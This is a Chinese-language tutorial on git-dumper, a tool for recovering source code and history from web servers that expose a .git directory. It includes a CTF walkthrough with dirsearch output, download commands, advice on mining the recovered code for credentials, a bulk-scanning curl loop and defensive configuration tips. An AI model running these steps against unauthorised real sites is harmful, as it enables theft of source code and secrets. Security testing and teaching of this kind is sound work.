# git-dumper

git-dumper 是一个用于从公开了 `.git` 目录的 Web 服务器上恢复完整 Git 仓库的工具。

## 核心原理

当一个网站的 `.git` 目录通过 Web 服务器对外暴露时，攻击者可以通过逐一下载 `.git/objects/`、`.git/refs/` 等文件，恢复出完整的源代码和版本历史。Git 的存储机制决定了这种恢复是可行的：

1. `.git/HEAD` 指向当前分支（如 `refs/heads/master`）
2. `.git/refs/heads/master` 记录最新 commit 的 SHA-1 哈希
3. `.git/objects/XX/YYYY...` 按哈希值的前两位分目录存储所有对象（commit、tree、blob）
4. 从 HEAD 引用的 commit 开始，递归解析所有 tree 和 blob，即可重建整个工作目录

这种漏洞通常发生在：
- Web 服务器未正确配置，将 `.git` 作为普通目录暴露
- 使用 `git clone` 部署应用后未删除 `.git`
- 反向代理（Nginx/Apache）默认 deny 了隐藏文件，但配置被覆盖

## 基本语法

```bash
git-dumper [选项] URL DIR
```

| 参数 | 说明 |
|------|------|
| `URL` | 目标 `.git` 目录的 URL（可包含或不包含 `.git/` 后缀） |
| `DIR` | 本地输出目录，恢复的仓库将保存在此 |

## 选项速查

| 选项 | 说明 |
|------|------|
| `--proxy PROXY` | 使用指定的代理（如 `http://127.0.0.1:8080`） |
| `--client-cert-p12 FILE` | PKCS#12 格式的客户端证书 |
| `--client-cert-p12-password PASS` | 客户端证书密码 |
| `-j, --jobs N` | 并发请求数（提高下载速度） |
| `-r, --retry N` | 请求失败后的重试次数 |
| `-t, --timeout N` | 单个请求超时时间（秒） |
| `-u, --user-agent UA` | 自定义 User-Agent |
| `-H, --header HEADER` | 附加自定义 HTTP 头（`NAME=VALUE` 格式，可多次使用） |

## 实战场景：从 dirsearch 发现 .git 到源码恢复

### 阶段一：dirsearch 发现暴露的 .git

对一个 CTF 目标进行 dirsearch 扫描：

```bash
dirsearch -u https://8411565ef239a5cc61969820.http-ctf2.dasctf.com/ -e php,html
```

扫描结果中出现了大量 `.git` 相关条目：

```
[12:03:44] 301 -  376B  - /.git  ->  http://.../.git/
[12:03:44] 403 -  317B  - /.git/
[12:03:44] 200 -   17B  - /.git/COMMIT_EDITMSG
[12:03:44] 200 -   73B  - /.git/description
[12:03:44] 200 -   23B  - /.git/HEAD
[12:03:44] 200 -   92B  - /.git/config
[12:03:44] 200 -  145B  - /.git/index
[12:03:44] 200 -  240B  - /.git/info/exclude
[12:03:45] 200 -  168B  - /.git/logs/HEAD
[12:03:45] 200 -  168B  - /.git/logs/refs/heads/master
[12:03:45] 200 -   41B  - /.git/refs/heads/master
[12:03:45] 403 -  325B  - /.git/objects/
```

### 阶段二：判断可恢复性

关键信号（满足以下多数条件即可尝试 git-dumper）：

| 状态码 | 路径 | 含义 |
|--------|------|------|
| 200 | `/.git/HEAD` | HEAD 文件可读 — 准确认正在使用的分支 |
| 200 | `/.git/refs/heads/master` | 分支引用可读 — 包含最新 commit 哈希 |
| 403 | `/.git/objects/` | objects 目录禁止列目录 — 常见，但单文件仍可能可读 |
| 200 | `/.git/config` | 仓库配置可读 — 可能含敏感信息（remote URL、密钥路径等） |

需要注意的是一般是扫描出来 200 的可读，但需要注意的是 `.git/` 目录 403 并不一定表示完全不可读。常规做法是先访问 `.git/HEAD` 看它的内容，如返回 `ref: refs/heads/master` 则可进行下一步。

### 阶段三：使用 git-dumper 恢复

```bash
# 基础用法
git-dumper https://8411565ef239a5cc61969820.http-ctf2.dasctf.com/.git/ ./dumped-repo

# 生产环境常用 — 加并发和重试，提高成功率
git-dumper https://target.com/.git/ ./dumped-repo \
  -j 10 \
  -r 5 \
  -t 30 \
  -u "Mozilla/5.0 (compatible; Googlebot/2.1)"
```

| 参数 | 值 | 说明 |
|------|-----|------|
| `URL` | `https://target.com/.git/` | URL 末尾带不带 `.git/` 均可，工具会自动处理 |
| `DIR` | `./dumped-repo` | 本地输出目录，工具会在内部执行 `git init` |
| `-j 10` | 10 并发 | 平衡速度与被封风险 |
| `-r 5` | 重试 5 次 | 网络不稳定时提高成功率 |
| `-t 30` | 超时 30s | 某些 objects 文件较大或服务器响应慢 |

### 阶段四：验证恢复结果

```bash
cd dumped-repo
git log --oneline          # 查看提交历史
git status                 # 检查工作区状态
git diff HEAD~1            # 查看最近一次提交的变更
```

如果恢复完整，`git log` 会显示原始仓库的完整提交历史。此时可以直接浏览源代码，查找硬编码的凭据、API 密钥、数据库连接信息，或者分析业务逻辑中的其他安全缺陷。

### 常见恢复障碍

| 现象 | 原因 | 处理 |
|------|------|------|
| `DIR` 目录为空 | 目标 URL 路径错误或 `.git` 目录未暴露 | 检查 `.git/HEAD` 是否返回 200，确认 URL 正确 |
| 部分 objects 下载失败 | loose object 被服务器规则拦截（如 `.pack` 文件） | 尝试降低并发 `-j 1`，或使用 `--proxy` 走 Burp 观察请求 |
| `git fsck` 报 missing blob | 某些 objects 被 `403` 拦截或使用了 pack file 而非 loose object | 确认 `.git/objects/pack/` 中的 `.pack` 和 `.idx` 文件是否可读 |
| 403 on `/.git/` | 目录列表被禁止但单个文件仍可读 | git-dumper 逐文件下载，目录 403 不影响恢复 — 只要 object 文件本身可读即可 |

### 深度恢复：处理 pack 文件

当 loose objects 无法完全恢复时（部分哈希未知），可以尝试从 pack 文件入手：

```bash
# 手动下载 pack 文件
wget https://target.com/.git/objects/pack/pack-xxx.idx
wget https://target.com/.git/objects/pack/pack-xxx.pack

# 将 pack 文件放入本地仓库的 objects/pack 目录
# 然后解包提取所有 objects
cd dumped-repo/.git/objects/pack
git unpack-objects < pack-xxx.pack
```

### 防护建议

从根本上消除此漏洞：

1. **部署时移除 `.git`** — 部署脚本中确保不复制 `.git` 目录（`rsync --exclude=.git`、`.dockerignore` 中添加 `.git`）
2. **Web 服务器拒绝隐藏文件** — Nginx/Apache 默认应配置 `location ~ /\. { deny all; }`，确保未被后续 `location` 块覆盖
3. **应用层防护** — 在 `web.config`（IIS）或 `.htaccess` 中显式拒绝 `.git` 路径
4. **WAF 规则** — 加入对 `/.git/` 路径请求的拦截规则，作为纵深防御的一层

## 检测与确认

在批量扫描中快速确认目标是否暴露了 `.git`：

```bash
# 拼接 URL 列表快速检查
while read url; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "$url/.git/HEAD")
  if [ "$status" = "200" ]; then
    echo "[VULN] $url"
  fi
done < targets.txt
```
